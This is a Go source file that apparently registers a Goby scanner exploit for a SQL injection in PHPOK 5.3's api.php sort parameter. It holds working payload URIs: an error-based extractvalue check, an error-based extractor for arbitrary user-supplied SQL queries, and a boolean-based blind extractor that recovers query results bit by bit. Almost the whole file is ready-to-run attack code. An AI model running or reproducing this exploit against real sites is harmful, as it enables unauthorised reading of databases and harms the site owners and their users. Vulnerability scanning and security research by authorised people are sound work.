package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "PHPOK 5.3 SQLi",
    "Description": "PHPOK 5.3 SQL injection. payload can't contains these chars: ', \", ",
    "Product": "PHPOK",
    "Homepage": "https://www.phpok.com/phpok.html",
    "DisclosureDate": "2019-12-01",
    "Author": "ovi3",
    "GobyQuery": "app=\"PHPOK\"",
    "Level": "3",
    "Impact": "",
    "Recommendation": "",
    "References": [
        "https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/PHPOK/PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%97%A0%E9%99%90%E5%88%B6%E6%B3%A8%E5%85%A5/"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sqliType",
            "type": "select",
            "value": "error_based,boolean_based"
        },
        {
            "name": "sqlQuery",
            "type": "input",
            "value": "select database()"
        }
    ],
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "sqli"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": [
            "PHPOK"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10241"
}`

	tryTwoTime := func(url string) (string, error) {
		// 尝试发两次包， 降低因网络问题使布尔盲注失败的记录
		if resp, err := httpclient.SimpleGet(url); err == nil {
			return resp.RawBody, nil
		}

		if resp, err := httpclient.SimpleGet(url); err == nil {
			return resp.RawBody, nil
		} else {
			return "", err
		}
	}

	respIsTrue := func(respBody string) bool {
		return strings.Contains(respBody, "SQL执行错误，请检查") || strings.Contains(respBody, "'parentheses not balanced'")
	}

	getLength := func(u *httpclient.FixUrl, query string) (int, error) {
		i := 0
		for {
			uri := `/api.php?c=project&f=index&token=1234&id=news&sort=1,(select+1+regexp+(select+IF(length((` + url.QueryEscape(query) + `))%3d` + strconv.Itoa(i) + `,0x28,0x31)))--+`
			if respBody, err := tryTwoTime(u.FixedHostInfo + uri); err == nil {
				if respIsTrue(respBody) {
					return i, nil
				}
			}

			i += 1
			if i > 52 {
				return 0, errors.New("can not determine length")
			}
		}

	}

	extract := func(u *httpclient.FixUrl, query string, length int) (string, error) {
		res := ""
		for i := 0; i < length; i++ {
			charBit := []string{"0"}
			for _, bitmask := range []string{"40", "20", "10", "08", "04", "02", "01"} {
				uri := `/api.php?c=project&f=index&token=1234&id=news&sort=1,(select+1+regexp+(select+IF(ord(substr((` + url.QueryEscape(query) + `),` + strconv.Itoa(i+1) + `,1))%260x` + bitmask + `,0x28,0x31)))--+`
				if respBody, err := tryTwoTime(u.FixedHostInfo + uri); err == nil {
					if respIsTrue(respBody) {
						charBit = append(charBit, "1")
					} else {
						charBit = append(charBit, "0")
					}
				}
			}
			charInt, err := strconv.ParseInt(strings.Join(charBit, ""), 2, 64)
			if err != nil {
				return "", err
			}
			res += string(charInt)
			fmt.Println("getting:", res)
		}

		return res, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := `/api.php?c=project&f=index&token=1234&id=news&sort=1%20and%20extractvalue(1,concat(0x7e,md5(12)))%20--+`
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				// 可报错注入
				if strings.Contains(resp.RawBody, "XPATH syntax error: '~c20ad4d76fe97759aa27a0c99bff671") {
					return true
				}

				// 可布尔注入
				if strings.Contains(resp.RawBody, "SQL执行错误，请检查") {
					cfg.URI = "/api.php?c=project&f=index&token=1234&id=news&sort=1--+"
					if resp2, err := httpclient.DoHttpRequest(u, cfg); err == nil {
						return !strings.Contains(resp2.RawBody, "SQL执行错误，请检查") && strings.Contains(resp2.Header.Get("Content-Type"), "application/json")
					}
				}
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sqliType := ss.Params["sqliType"].(string)
			sqlQuery := ss.Params["sqlQuery"].(string)
			if sqliType == "error_based" {
				uri := `/api.php?c=project&f=index&token=1234&id=news&sort=1%20and%20extractvalue(1,concat(0x7e,(` + url.QueryEscape(sqlQuery) + `),0x7e))%20--+`
				cfg := httpclient.NewGetRequestConfig(uri)
				cfg.VerifyTls = false
				cfg.FollowRedirect = false

				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					if resp.StatusCode == 200 {
						m := regexp.MustCompile(`(?s)XPATH syntax error: '~(.*?)~'`).FindStringSubmatch(resp.Utf8Html)
						if len(m) > 0 {
							expResult.Success = true
							expResult.Output = strings.TrimSpace(m[1])
						} else {
							expResult.Output = "response doesn't contains specific error info. response is :\n" + resp.Utf8Html // 可能包含程序报错信息
						}
					}
				}
			} else if sqliType == "boolean_based" {
				length, err := getLength(expResult.HostInfo, sqlQuery)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				fmt.Println("length: ", length)

				res, err := extract(expResult.HostInfo, sqlQuery, length)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = res

			}

			return expResult
		},
	))
}
